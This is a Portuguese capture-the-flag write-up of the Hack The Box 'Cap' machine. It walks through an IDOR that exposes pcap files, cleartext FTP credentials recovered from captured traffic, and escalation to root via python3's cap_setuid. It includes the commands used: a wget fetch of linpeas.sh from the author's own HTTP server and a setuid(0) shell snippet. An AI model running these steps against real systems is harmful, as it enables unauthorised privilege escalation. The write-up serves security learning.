# Máquina: Cap (Hack The Box)

## Enumeração

Inicialmente realizei uma varredura para identificar os serviços disponíveis na máquina alvo.  
````bash
nmap -sC -sV <target ip>
````

<img width="780" height="293" alt="nmap reall" src="https://github.com/user-attachments/assets/daed4a07-e8ec-4c6b-9d19-164043a05cd4" />

Foi possível identificar três portas abertas na máquina alvo:  
porta 21 - Rodando o serviço ftp.   
porta 22 - Rodando o serviço ssh.  
porta 80 - Rodando o serviço http.

Com essas informações, eu comecei a investigar a página web online com o ip da máquina. Entrando na página web, descobri que ela se tratava sobre uma dashboard de análise e segurança de rede e na aba "Security Snapshot" estáva disponível arquivos pcap que continham gravaçôes de tráfego de rede, mas para o ID que eu estava acessando, o tráfego estava vazio.
<img width="1920" height="997" alt="pagina web id 10" src="https://github.com/user-attachments/assets/01681f77-f833-4fb8-8199-602cd361beb6" />

Entretando, consegui identificar uma vulnerabilidade "IDOR" que me permitia navegar entre painéis de outros usuários no "Security Snapshot" somente alterando o ID na URL da página.  
<img width="448" height="40" alt="pagina web id 10" src="https://github.com/user-attachments/assets/f8de43ad-e6d2-4609-88f5-de3c6b866560" />

## Exploração

Explorando os IDs, encontrei tráfego de rede presente no id "0", baixei o arquivo 0.pcap disponível e fui analisar no wireshark. Analisando o tráfego e troca de pacotes, lá estava presente uma conexão FTP que disponibilizava o User e o password do usuário "nathan".

<img width="1920" height="1044" alt="user e pass" src="https://github.com/user-attachments/assets/0062b33e-fbf7-4297-87d2-7423b3b95b55" />

Com essas credenciais, consegui entrar no serviço ftp com o usuário "nathan".Dentro do serviço, consegui a primeira flag do ctf "user.txt" e consegui um arquivo linpeas.sh, que baixei para a minha máquina.  
  
-**Os arquivos linpeas.sh possuem scripts que identificam possíveis vulnerabilidades em sistemas locais, nos permitindo escalar privilégios dentro da máquina alvo.**   

Também com as credenciais do usuário "nathan", consegui me conectar na máquina alvo via SSH. Já conectado ao sistema como usuário comum, eu precisava do arquivo linpeas.sh nesta máquina, então abri um server no meu sistema que permitia outras máquinas baixarem os arquivos na pasta presente.  
  
Na minha máquina:
````bash
python3 -m http.server 8000
````
Na máquina alvo:
````bash
wget http://<ipDaMinhaMaquina>:8000/linpeas.sh
````

Executei o linpeas na máquina alvo e ele me revelou que o python3 tinha cap_setuid, que é a capacidade de alterar o UID dos usuários, o que me possibilitaria alterar o UID do usuário "nathan" o tornando root ( root = UID 0).

<img width="466" height="53" alt="set-uid" src="https://github.com/user-attachments/assets/f98ee82a-ba1a-4a50-96fc-a9301225b367" /> 

Então, executando o python consegui tornar o usuário "nathan" root no sistema.  

````bash
import os
os.setuid(0)
os.system(/bin/bash)
````
Já no bash e agora como root no sistema, entrei no diretório root e lá estava a segunda e última flag do CTF "root.txt", assim, finalizando com sucesso está máquina.  

## Conclusão
A máquina Cap demonstrou, de forma prática, como falhas simples de lógica e configuração podem levar à completa comprometimento de um sistema. A exploração iniciou-se a partir de uma vulnerabilidade do tipo IDOR (Insecure Direct Object Reference) em uma aplicação web, onde a manipulação de identificadores numéricos na URL permitiu o acesso a arquivos PCAP de outros usuários.

A análise dessas capturas de tráfego revelou credenciais em texto claro para o serviço FTP, possibilitando o acesso inicial ao sistema e a obtenção da primeira flag. Utilizando as mesmas credenciais, foi possível realizar login via SSH e iniciar a enumeração local da máquina.

Durante a enumeração com o linPEAS, foi identificada uma configuração insegura envolvendo Linux capabilities, onde o binário python3 possuía a capability cap_setuid. Essa configuração permitiu a alteração do UID do processo para 0, resultando em privilege escalation para root e na obtenção da segunda flag.

Essa máquina reforça a importância da enumeração cuidadosa, da análise do comportamento das aplicações e do entendimento de mecanismos internos do sistema operacional, como UID e capabilities. Além disso, evidencia que falhas de configuração frequentemente representam vetores de ataque mais simples e eficazes do que vulnerabilidades complexas.







